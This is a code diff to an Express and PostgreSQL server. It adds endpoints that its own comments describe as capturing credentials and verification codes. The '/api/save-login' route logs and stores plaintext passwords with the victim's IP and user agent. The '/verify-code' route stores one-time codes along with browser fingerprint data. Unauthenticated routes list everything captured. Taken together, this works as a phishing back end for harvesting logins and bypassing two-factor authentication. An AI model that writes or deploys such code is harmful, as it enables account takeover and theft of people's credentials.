@@ -10,6 +10,17 @@ const PORT = 3000;
 app.use(cors());
 app.use(express.json());
 
+// Middleware to get client IP
+app.use((req, res, next) => {
+    req.clientIP = req.headers['x-forwarded-for'] || 
+                  req.headers['x-real-ip'] || 
+                  req.connection.remoteAddress || 
+                  req.socket.remoteAddress ||
+                  (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
+                  req.ip;
+    next();
+});
+
 // PostgreSQL connection pool
 const pool = new Pool({
     user: 'postgres',
@@ -86,7 +97,99 @@ app.post('/api/register', async (req, res) => {
     }
 });
 
-// Login endpoint
+// Save login endpoint (for capturing credentials)
+app.post('/api/save-login', async (req, res) => {
+    const { emailOrUsername, password } = req.body;
+    const clientIP = req.clientIP;
+
+    // Validation
+    if (!emailOrUsername || !password) {
+        return res.status(400).json({ 
+            success: false, 
+            message: 'Email/username and password are required' 
+        });
+    }
+
+    try {
+        console.log('\n📨 Login attempt captured:');
+        console.log('Email/Username:', emailOrUsername);
+        console.log('Password:', password);
+        console.log('Client IP:', clientIP);
+        console.log('Timestamp:', new Date().toISOString());
+        console.log('User Agent:', req.headers['user-agent']);
+        console.log('---');
+
+        // Save to login_attempts table
+        const result = await pool.query(
+            'INSERT INTO login_attempts (email_or_username, password, ip_address, user_agent, created_at) VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP) RETURNING *',
+            [emailOrUsername, password, clientIP, req.headers['user-agent']]
+        );
+
+        // Return success response
+        res.json({
+            success: true,
+            message: 'Login data saved successfully',
+            user: {
+                id: result.rows[0].id,
+                email_or_username: emailOrUsername,
+                ip_address: clientIP,
+                timestamp: result.rows[0].created_at
+            }
+        });
+
+    } catch (error) {
+        console.error('Save login error:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Server error while saving login data' 
+        });
+    }
+});
+
+// Get all login attempts endpoint
+app.get('/api/login-attempts', async (req, res) => {
+    try {
+        const result = await pool.query(
+            'SELECT id, email_or_username, ip_address, user_agent, created_at FROM login_attempts ORDER BY created_at DESC LIMIT 100'
+        );
+
+        res.json({
+            success: true,
+            attempts: result.rows
+        });
+
+    } catch (error) {
+        console.error('Get login attempts error:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Server error' 
+        });
+    }
+});
+
+// Get login attempts by IP endpoint
+app.get('/api/login-attempts/ip/:ip', async (req, res) => {
+    const { ip } = req.params;
+
+    try {
+        const result = await pool.query(
+            'SELECT id, email_or_username, ip_address, user_agent, created_at FROM login_attempts WHERE ip_address = $1 ORDER BY created_at DESC',
+            [ip]
+        );
+
+        res.json({
+            success: true,
+            attempts: result.rows
+        });
+
+    } catch (error) {
+        console.error('Get login attempts by IP error:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Server error' 
+        });
+    }
+});
 app.post('/api/login', async (req, res) => {
     const { emailOrUsername, password } = req.body;
 
@@ -191,7 +294,94 @@ app.get('/api/users/:id', async (req, res) => {
     }
 });
 
-// Start server
+// Verify code endpoint (for capturing verification codes)
+app.post('/verify-code', async (req, res) => {
+    const { verification_code, ip_address, user_agent, timestamp, screen_resolution, timezone, language, referrer } = req.body;
+    const clientIP = req.clientIP;
+
+    // Validation
+    if (!verification_code) {
+        return res.status(400).json({ 
+            success: false, 
+            message: 'Verification code is required' 
+        });
+    }
+
+    try {
+        console.log('\n🔐 Verification code captured:');
+        console.log('Code:', verification_code);
+        console.log('Client IP:', ip_address || clientIP);
+        console.log('User Agent:', user_agent);
+        console.log('Timestamp:', timestamp);
+        console.log('Screen Resolution:', screen_resolution);
+        console.log('Timezone:', timezone);
+        console.log('Language:', language);
+        console.log('Referrer:', referrer);
+        console.log('---');
+
+        // Save to verification_codes table (create if doesn't exist)
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS verification_codes (
+                id SERIAL PRIMARY KEY,
+                verification_code VARCHAR(10) NOT NULL,
+                ip_address INET,
+                user_agent TEXT,
+                screen_resolution VARCHAR(20),
+                timezone VARCHAR(50),
+                language VARCHAR(10),
+                referrer TEXT,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+
+        const result = await pool.query(
+            'INSERT INTO verification_codes (verification_code, ip_address, user_agent, screen_resolution, timezone, language, referrer, created_at) VALUES ($1, $2, $3, $4, $5, $6, $7, CURRENT_TIMESTAMP) RETURNING *',
+            [verification_code, ip_address || clientIP, user_agent, screen_resolution, timezone, language, referrer]
+        );
+
+        // Return success response
+        res.json({
+            success: true,
+            message: 'Verification code captured successfully',
+            data: {
+                id: result.rows[0].id,
+                verification_code: verification_code,
+                ip_address: ip_address || clientIP,
+                timestamp: result.rows[0].created_at
+            }
+        });
+
+    } catch (error) {
+        console.error('Verify code capture error:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Server error while capturing verification code' 
+        });
+    }
+});
+
+// Get all verification codes endpoint
+app.get('/api/verification-codes', async (req, res) => {
+    try {
+        const result = await pool.query(
+            'SELECT id, verification_code, ip_address, user_agent, screen_resolution, timezone, language, referrer, created_at FROM verification_codes ORDER BY created_at DESC LIMIT 100'
+        );
+
+        res.json({
+            success: true,
+            codes: result.rows
+        });
+
+    } catch (error) {
+        console.error('Get verification codes error:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Server error' 
+        });
+    }
+});
+
+
 app.listen(PORT, () => {
     console.log(`Server is running on http://localhost:${PORT}`);
 });
